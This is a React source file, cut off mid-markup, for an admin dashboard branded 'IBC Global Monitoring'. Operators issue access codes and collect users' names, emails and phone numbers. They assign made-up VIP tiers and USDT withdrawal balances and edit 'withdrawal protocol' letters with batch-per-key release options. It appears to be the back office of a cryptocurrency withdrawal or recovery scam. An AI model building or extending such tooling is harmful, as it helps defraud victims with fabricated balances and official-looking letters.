import React, { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, LogOut, ShieldCheck, Key, ExternalLink, X } from "lucide-react";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";
import { motion } from "framer-motion";

interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
}

interface CaseLetter {
  id: number;
  caseId: string;
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionBTitle?: string;
  optionBDescription?: string;
}

interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

export default function AdminDashboard() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [authToken, setAuthToken] = useState<string | null>(null);
  const [loginUsername, setLoginUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  
  const [cases, setCases] = useState<Case[]>([]);
  const [allSubmissions, setAllSubmissions] = useState<Submission[]>([]);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [newAccessCode, setNewAccessCode] = useState("");
  const [isFinalizeOpen, setIsFinalizeOpen] = useState(false);
  const [isLetterEditorOpen, setIsLetterEditorOpen] = useState(false);
  const [isSubmissionsOpen, setIsSubmissionsOpen] = useState(false);
  const [caseSubmissions, setCaseSubmissions] = useState<Submission[]>([]);
  const [letterData, setLetterData] = useState<Partial<CaseLetter>>({
    headline: "Withdrawal Protocol Selection",
    introduction: "",
    bodyContent: "",
    footerNote: "",
    optionATitle: "Accelerated Release",
    optionADescription: "",
    optionBTitle: "Standard Release",
    optionBDescription: ""
  });
  const [finalizeData, setFinalizeData] = useState<AdminData>({
    vipStatus: "Gold Tier",
    username: "",
    withdrawalAmount: "500,000 USDT",
    withdrawalBatches: "10",
    physilocal0: "PHY-001"
  });
  
  const { toast } = useToast();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoggingIn(true);
    
    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: loginUsername,
          password: loginPassword
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAuthToken(data.token);
        setIsLoggedIn(true);
        sessionStorage.setItem('adminToken', data.token);
        toast({ title: "Access Granted", description: "Admin session established." });
      } else {
        toast({ variant: "destructive", title: "Access Denied", description: "Invalid credentials." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Connection Error", description: "Unable to authenticate." });
    }
    
    setIsLoggingIn(false);
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setAuthToken(null);
    setLoginUsername("");
    setLoginPassword("");
    sessionStorage.removeItem('adminToken');
    toast({ title: "Logged Out", description: "Admin session ended." });
  };

  // Check for existing session on mount
  useEffect(() => {
    const storedToken = sessionStorage.getItem('adminToken');
    if (storedToken) {
      fetch('/api/admin/verify', {
        headers: { 'Authorization': `Bearer ${storedToken}` }
      }).then(res => {
        if (res.ok) {
          setAuthToken(storedToken);
          setIsLoggedIn(true);
        } else {
          sessionStorage.removeItem('adminToken');
        }
      }).catch(() => {
        sessionStorage.removeItem('adminToken');
      });
    }
  }, []);

  // Session timeout after 3 minutes of inactivity
  useEffect(() => {
    if (!isLoggedIn) return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        handleLogout();
        toast({ title: "Session Expired", description: "You have been logged out due to inactivity." });
      }, 3 * 60 * 1000); // 3 minutes
    };

    const handleActivity = () => resetTimeout();

    // Add activity listeners
    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [isLoggedIn]);

  const loadData = async (showToast = false) => {
    try {
      const [casesRes, submissionsRes] = await Promise.all([
        fetch('/api/cases'),
        fetch('/api/submissions')
      ]);
      
      if (casesRes.ok) {
        const data = await casesRes.json();
        setCases(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setAllSubmissions(data);
      }
      
      if (showToast) {
        toast({ title: "Refreshed", description: "Data has been updated." });
      }
    } catch (error) {
      console.error('Failed to load data:', error);
      if (showToast) {
        toast({ variant: "destructive", title: "Error", description: "Failed to refresh data." });
      }
    }
  };

  useEffect(() => {
    if (isLoggedIn) {
      loadData();
      const interval = setInterval(loadData, 3000);
      return () => clearInterval(interval);
    }
  }, [isLoggedIn]);

  const clearData = async () => {
    if(confirm("Clear all simulated records?")) {
      try {
        await Promise.all(cases.map(c => 
          fetch(`/api/cases/${c.id}`, { method: 'DELETE' })
        ));
        loadData();
        toast({ title: "All cases cleared", description: "Database has been reset." });
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to clear cases." });
      }
    }
  };

  const handleCreateCase = async () => {
    if (!newAccessCode) return;
    
    try {
      console.log('Creating case with access code:', newAccessCode);
      const response = await fetch('/api/cases', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accessCode: newAccessCode,
          status: 'created'
        })
      });

      console.log('Response status:', response.status);
      
      if (response.ok) {
        const newCase = await response.json();
        setIsCreateOpen(false);
        setNewAccessCode("");
        loadData();
        toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
      } else {
        const errorText = await response.text();
        console.error('Error response:', errorText);
        try {
          const errorData = JSON.parse(errorText);
          toast({ variant: "destructive", title: "Error", description: errorData.error || "Failed to create case." });
        } catch {
          toast({ variant: "destructive", title: "Error", description: errorText || "Failed to create case." });
        }
      }
    } catch (error) {
      console.error('Fetch error:', error);
      toast({ variant: "destructive", title: "Error", description: "Failed to create case. Check console for details." });
    }
  };

  const openFinalizeModal = (c: Case) => {
    setSelectedCase(c);
    setFinalizeData({
      ...finalizeData,
      username: c.userName || ""
    });
    setIsFinalizeOpen(true);
  };

  const openLetterEditor = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/letter`);
      if (response.ok) {
        const data = await response.json();
        if (data) {
          setLetterData(data);
        } else {
          setLetterData({
            headline: "Withdrawal Protocol Selection",
            introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
            footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
            optionATitle: "Accelerated Release",
            optionADescription: "Full withdrawal amount processed in accelerated batches.",
            optionBTitle: "Standard Release",
            optionBDescription: "Half allocation processed in standard batches."
          });
        }
      }
    } catch (error) {
      console.error('Failed to load letter:', error);
    }
    setIsLetterEditorOpen(true);
  };

  const openSubmissionsModal = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/submissions`);
      if (response.ok) {
        const data = await response.json();
        setCaseSubmissions(data);
      }
    } catch (error) {
      console.error('Failed to load submissions:', error);
    }
    setIsSubmissionsOpen(true);
  };

  const handleSaveLetter = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}/letter`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(letterData)
      });

      if (response.ok) {
        setIsLetterEditorOpen(false);
        toast({ title: "Letter Saved", description: "Custom letter content has been saved." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
    }
  };

  const handleFinalize = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'active',
          vipStatus: finalizeData.vipStatus,
          username: finalizeData.username,
          withdrawalAmount: finalizeData.withdrawalAmount,
          withdrawalBatches: finalizeData.withdrawalBatches,
          physilocal0: finalizeData.physilocal0
        })
      });

      if (response.ok) {
        setIsFinalizeOpen(false);
        setSelectedCase(null);
        loadData();
        toast({ title: "Account Activated", description: "User can now access the secure letter." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
    }
  };

  const getCaseSubmissionCount = (caseId: string) => {
    return allSubmissions.filter(s => s.caseId === caseId).length;
  };

  const handleDeleteSubmission = async (submissionId: number) => {
    if (confirm("Delete this submission? This action cannot be undone.")) {
      try {
        const response = await fetch(`/api/submissions/${submissionId}`, {
          method: 'DELETE'
        });

        if (response.ok) {
          loadData(true);
          toast({ title: "Submission Deleted", description: "The submission has been removed." });
        } else {
          toast({ variant: "destructive", title: "Error", description: "Failed to delete submission." });
        }
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to delete submission." });
      }
    }
  };

  // LOGIN PAGE
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
          <div className="text-center mb-8">
            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-admin-logo" />
            <h1 className="text-xl font-bold text-white tracking-wider">ADMIN CONTROL PANEL</h1>
            <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">ISO-D Compliance Management</p>
          </div>
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white text-center flex items-center justify-center gap-2">
                <ShieldCheck className="w-4 h-4 text-amber-500" /> Administrator Access
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Username</label>
                  <div className="relative">
                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="text" 
                      placeholder="Enter admin username" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600"
                      value={loginUsername}
                      onChange={(e) => setLoginUsername(e.target.value)}
                      data-testid="input-admin-username"
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Password</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="password" 
                      placeholder="Enter password" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600"
                      value={loginPassword}
                      onChange={(e) => setLoginPassword(e.target.value)}
                      data-testid="input-admin-password"
                    />
                  </div>
                </div>
                <Button 
                  type="submit" 
                  className="w-full bg-amber-600 hover:bg-amber-700 text-white"
                  disabled={isLoggingIn}
                  data-testid="button-admin-login"
                >
                  {isLoggingIn ? "Authenticating..." : "Access Control Panel"}
                </Button>
              </form>
            </CardContent>
            <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
              <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
                 <Lock className="w-3 h-3" /> Restricted Access • ISO-D Level 1
              </div>
            </CardFooter>
          </Card>
        </motion.div>
      </div>
    );
  }

  // ADMIN DASHBOARD
  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 font-sans">
      <header className="bg-slate-950 border-b border-slate-800 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-3">
           <img src={ibcLogo} alt="Logo" className="h-8 w-8 opacity-80 grayscale" data-testid="img-logo" />
           <div>
             <h1 className="font-bold text-lg tracking-tight text-white">IBC GLOBAL MONITORING</h1>
             <div className="flex items-center gap-2 text-[10px] uppercase tracking-wider text-slate-400">
               <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
               System Active • ISO-D Clearance Level 1
             </div>
           </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="text-right hidden md:block">
            <p className="text-xs text-slate-400">Admin Session</p>
            <p className="text-sm font-bold text-white">Compliance Officer</p>
          </div>
          <a href="/" target="_blank" rel="noopener noreferrer">
            <Button 
              variant="outline" 
              size="sm" 
              className="border-slate-700 bg-slate-800 text-slate-300 hover:text-white"
              data-testid="button-user-portal"
            >
              <ExternalLink className="w-4 h-4 mr-2" /> User Portal
            </Button>
          </a>
          <Button 
            variant="ghost" 
            size="sm" 
            className="text-slate-400 hover:text-white"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-4 h-4 mr-2" /> Logout
          </Button>
        </div>
      </header>

      <main className="p-6 max-w-7xl mx-auto">
        <Tabs defaultValue="cases" className="space-y-6">
          <TabsList className="bg-slate-800 border-slate-700">
            <TabsTrigger value="cases" className="data-[state=active]:bg-slate-700" data-testid="tab-cases">
              <FileText className="w-4 h-4 mr-2" /> Cases
            </TabsTrigger>
            <TabsTrigger value="submissions" className="data-[state=active]:bg-slate-700" data-testid="tab-submissions">
              <FolderOpen className="w-4 h-4 mr-2" /> All Submissions
            </TabsTrigger>
          </TabsList>

          <TabsContent value="cases">
            <div className="flex justify-between items-end mb-6">
              <div>
                <h2 className="text-2xl font-bold text-white mb-1">Case Management</h2>
                <p className="text-slate-400 text-sm">Manage secure access codes, edit letters, and approve synchronizations.</p>
              </div>
              <div className="flex gap-2">
                <Button onClick={() => setIsCreateOpen(true)} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-new-case">
                  <Plus className="w-4 h-4 mr-2" /> New Case
                </Button>
                <Button variant="destructive" size="sm" onClick={clearData} data-testid="button-clear">
                  <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
                </Button>
              </div>
            </div>

            {cases.some(c => c.status === 'syncing') && (
              <div className="mb-6 bg-amber-500/10 border border-amber-500/20 rounded-lg p-4 flex items-center justify-between">
                <div className="flex items-center gap-3 text-amber-500">
                  <ShieldAlert className="w-6 h-6 animate-pulse" />
                  <div>
                    <h3 className="font-bold">Action Required</h3>
                    <p className="text-sm opacity-80">There are users waiting for synchronization approval.</p>
                  </div>
                </div>
              </div>
            )}

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <CardHeader className="border-b border-slate-800 bg-slate-900/50 py-4">
                 <div className="flex justify-between items-center">
                   <CardTitle className="text-base font-medium text-white">Active Cases</CardTitle>
                   <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300" onClick={() => loadData(true)} data-testid="button-refresh">
                     <RefreshCw className="w-4 h-4 mr-2" /> Refresh
                   </Button>
                 </div>
              </CardHeader>
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400 w-[100px]">Status</TableHead>
                      <TableHead className="text-slate-400">Access Code</TableHead>
                      <TableHead className="text-slate-400">User Identity</TableHead>
                      <TableHead className="text-slate-400">Contact</TableHead>
                      <TableHead className="text-slate-400 text-center">Submissions</TableHead>
                      <TableHead className="text-slate-400 text-center">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {cases.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={6} className="text-center py-12 text-slate-500">
                          No active cases. Create one to get started.
                        </TableCell>
                      </TableRow>
                    ) : (
                      cases.map((c) => (
                        <TableRow key={c.id} className="hover:bg-slate-900/50 border-slate-800 group" data-testid={`row-case-${c.id}`}>
                          <TableCell>
                            <Badge variant="outline" className={`
                              ${c.status === 'created' ? 'text-slate-400 border-slate-700' : ''}
                              ${c.status === 'registered' ? 'text-blue-400 border-blue-700 bg-blue-500/10' : ''}
                              ${c.status === 'syncing' ? 'text-amber-400 border-amber-700 bg-amber-500/10 animate-pulse' : ''}
                              ${c.status === 'active' ? 'text-green-400 border-green-700 bg-green-500/10' : ''}
                              ${c.status === 'completed' ? 'text-purple-400 border-purple-700 bg-purple-500/10' : ''}
                            `}>
                              {c.status.toUpperCase()}
                            </Badge>
                          </TableCell>
                          <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
                          <TableCell className="text-slate-300">
                            {c.userName ? (
                               <div className="font-medium text-white">{c.userName}</div>
                            ) : (
                              <span className="text-slate-600 italic">Pending Login...</span>
                            )}
                          </TableCell>
                          <TableCell className="text-slate-400 text-sm">
                            {c.userEmail ? (
                              <div className="flex flex-col">
                                <span>{c.userEmail}</span>
                                <span className="text-xs opacity-70">{c.userMobile}</span>
                              </div>
                            ) : (
                              "-"
                            )}
                          </TableCell>
                          <TableCell className="text-center">
                            <Badge variant="outline" className="text-slate-400 border-slate-700">
                              {getCaseSubmissionCount(c.id)} submissions
                            </Badge>
                          </TableCell>
                          <TableCell>
                            <div className="flex justify-center gap-2">
                              {c.status === 'syncing' && (
                                <Button 
                                  size="sm" 
                                  className="bg-amber-600 hover:bg-amber-700 text-white"
                                  onClick={() => openFinalizeModal(c)}
                                  data-testid={`button-finalize-${c.id}`}
                                >
                                  <UserCheck className="w-4 h-4 mr-1" /> Finalize
                                </Button>
                              )}
                              {(c.status === 'active' || c.status === 'syncing') && (
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  className="border-slate-700 bg-slate-800"
                                  onClick={() => openLetterEditor(c)}
                                  data-testid={`button-edit-letter-${c.id}`}
                                >
                                  <Edit3 className="w-4 h-4 mr-1" /> Letter
                                </Button>
                              )}
                              {getCaseSubmissionCount(c.id) > 0 && (
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  className="border-slate-700 bg-slate-800"
                                  onClick={() => openSubmissionsModal(c)}
                                  data-testid={`button-view-submissions-${c.id}`}
                                >
                                  <History className="w-4 h-4 mr-1" /> History
                                </Button>
                              )}
                            </div>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="submissions">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-white mb-1">All Submissions</h2>
              <p className="text-slate-400 text-sm">View all user submissions across all cases.</p>
            </div>

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400">Date</TableHead>
                      <TableHead className="text-slate-400">User</TableHead>
                      <TableHead className="text-slate-400">Email</TableHead>
                      <TableHead className="text-slate-400">Option</TableHead>
                      <TableHead className="text-slate-400">Amount</TableHead>
                      <TableHead className="text-slate-400">Batches</TableHead>
                      <TableHead className="text-slate-400 text-center">Action</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {allSubmissions.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={7} className="text-center py-12 text-slate-500">
                          No submissions yet.
                        </TableCell>
                      </TableRow>
                    ) : (
                      allSubmissions.map((s) => (
                        <TableRow key={s.id} className="hover:bg-slate-900/50 border-slate-800" data-testid={`row-submission-${s.id}`}>
                          <TableCell className="text-slate-300 text-sm">
                            {new Date(s.submittedAt).toLocaleString()}
                          </TableCell>
                          <TableCell className="text-white font-medium">{s.userName || "-"}</TableCell>
                          <TableCell className="text-slate-400 text-sm">{s.userEmail || "-"}</TableCell>
                          <TableCell>
                            <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                              Option {s.selectedOption}
                            </Badge>
                          </TableCell>
                          <TableCell className="text-green-400 font-medium">{s.withdrawalAmount || "-"}</TableCell>
                          <TableCell className="text-slate-300">{s.withdrawalBatches || "-"}</TableCell>
                          <TableCell className="text-center">
                            <Button 
                              size="sm" 
                              variant="ghost"
                              className="text-red-400 hover:text-red-300 hover:bg-red-500/10"
                              onClick={() => handleDeleteSubmission(s.id)}
                              data-testid={`button-delete-submission-${s.id}`}
                            >
                              <X className="w-4 h-4" />
                            </Button>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>
        </Tabs>
      </main>

      {/* Create Case Modal */}
      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Create Secure Access Case</DialogTitle>
            <DialogDescription className="text-slate-400">
              Generate a unique password for the user to access the portal.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <Label htmlFor="code" className="text-slate-400">Access Password</Label>
            <Input 
              id="code" 
              value={newAccessCode} 
              onChange={(e) => setNewAccessCode(e.target.value)}
              className="bg-slate-900 border-slate-700 text-white mt-2"
              placeholder="e.g. 774982" 
              data-testid="input-access-code"
            />
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsCreateOpen(false)}>Cancel</Button>
            <Button onClick={handleCreateCase} className="bg-blue-600 text-white" data-testid="button-create-case">Create Case</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Finalize Sync Modal */}
      <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Finalize Account Reactivation</DialogTitle>
            <DialogDescription className="text-slate-400">
              Input user details to complete synchronization.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">VIP Status</Label>
                <Input 
                  value={finalizeData.vipStatus}
                  onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-vip-status"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Physilocal0</Label>
                <Input 
                  value={finalizeData.physilocal0}
                  onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-physilocal0"
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Username</Label>
              <Input 
                value={finalizeData.username}
                onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
                data-testid="input-username"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">Withdrawal Amount</Label>
                <Input 
                  value={finalizeData.withdrawalAmount}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-withdrawal-amount"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Batches</Label>
                <Input 
                  value={finalizeData.withdrawalBatches}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-batches"
                />
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
            <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2" data-testid="button-finalize-submit">
              <UserCheck className="w-4 h-4" /> Accept & Finalize
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Letter Editor Modal */}
      <Dialog open={isLetterEditorOpen} onOpenChange={setIsLetterEditorOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Edit3 className="w-5 h-5" /> Edit Letter Content
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Customize the withdrawal letter for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="space-y-2">
              <Label className="text-slate-400">Headline</Label>
              <Input 
                value={letterData.headline || ""}
                onChange={(e) => setLetterData({...letterData, headline: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
                data-testid="input-letter-headline"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Introduction</Label>
              <Textarea 
                value={letterData.introduction || ""}
                onChange={(e) => setLetterData({...letterData, introduction: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
                placeholder="Dear [User Name],..."
                data-testid="input-letter-introduction"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Body Content</Label>
              <Textarea 
                value={letterData.bodyContent || ""}
                onChange={(e) => setLetterData({...letterData, bodyContent: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[100px]"
                placeholder="Main letter content..."
                data-testid="input-letter-body"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Footer Note</Label>
              <Textarea 
                value={letterData.footerNote || ""}
                onChange={(e) => setLetterData({...letterData, footerNote: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                data-testid="input-letter-footer"
              />
            </div>

            <div className="border-t border-slate-800 pt-4">
              <h4 className="text-sm font-medium text-slate-300 mb-3">Option Customization</h4>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-slate-400">Option A Title</Label>
                  <Input 
                    value={letterData.optionATitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionATitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-a-title"
                  />
                  <Textarea 
                    value={letterData.optionADescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionADescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option A description..."
                    data-testid="input-option-a-desc"
                  />
                  <div>
                    <Label className="text-slate-400">Amount</Label>
                    <Input 
                      value={letterData.optionAAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionAAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 15000"
                      data-testid="input-option-a-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Batch Details</Label>
                    <Textarea 
                      value={letterData.optionABatches || ""}
                      onChange={(e) => setLetterData({...letterData, optionABatches: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1 min-h-[60px]"
                      placeholder="e.g., 3000 per key. Total = 5keys (75,000 USDT) Every 6 hours"
                      data-testid="input-option-a-batches"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Total Withdrawal Amount</Label>
                    <Input 
                      value={letterData.optionATotalAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionATotalAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 75,000 USDT"
                      data-testid="input-option-a-total-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Fileloco ID</Label>
                    <Input 
                      value={letterData.optionAFilelocoId || ""}
                      onChange={(e) => setLetterData({...letterData, optionAFilelocoId: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 11223344"
                      data-testid="input-option-a-fileloco"
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label className="text-slate-400">Option B Title</Label>
                  <Input 
                    value={letterData.optionBTitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionBTitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-b-title"
                  />
                  <Textarea 
                    value={letterData.optionBDescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionBDescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option B description..."
                    data-testid="input-option-b-desc"
                  />
                  <div>
                    <Label className="text-slate-400">Amount</Label>
                    <Input 
                      value={letterData.optionBAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionBAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 7500"
                      data-testid="input-option-b-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Batch Details</Label>
                    <Textarea 
                      value={letterData.optionBBatches || ""}
                      onChange={(e) => setLetterData({...letterData, optionBBatches: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1 min-h-[60px]"
                      placeholder="e.g., 2000 per key. Total = 8keys (75,000 USDT) Every 12 hours"
                      data-testid="input-option-b-batches"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Total Withdrawal Amount</Label>
